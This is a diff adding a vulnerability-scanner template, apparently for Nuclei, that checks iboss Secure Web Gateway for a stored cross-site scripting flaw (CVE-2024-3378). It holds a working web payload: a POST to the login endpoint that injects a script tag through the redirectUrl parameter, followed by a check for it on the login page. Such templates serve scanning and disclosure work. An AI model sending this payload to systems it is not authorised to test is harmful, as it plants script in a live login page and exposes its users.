@@ -1,0 +1,43 @@
+id: iboss-stored-xss
+
+info:
+  name: iboss Secure Web Gateway - Stored Cross-Site Scripting (XSS)
+  author: Vulnpire
+  severity: high
+  description: >
+    A stored Cross Site Scripting (XSS) vulnerability was found in the iboss Secure Web Gateway product. 
+    The vulnerability is exploited by submitting a login attempt, intercepting the request, 
+    and adding a payload to the "redirectUrl" parameter before sending it to the server. 
+  reference:
+    - https://github.com/modrnProph3t/CVE/blob/main/CVE-2024-3378.md
+  tags: xss, stored
+
+requests:
+  - raw:
+      - |
+        POST /user_login_submit HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        userName=TEST&x=TEST&action=login&redirectUrl=%22%3E%3Cscript%3Eprompt('XSS')%3C/script%3E
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "prompt('XSS')"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/login"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<script>prompt('XSS')</script>"
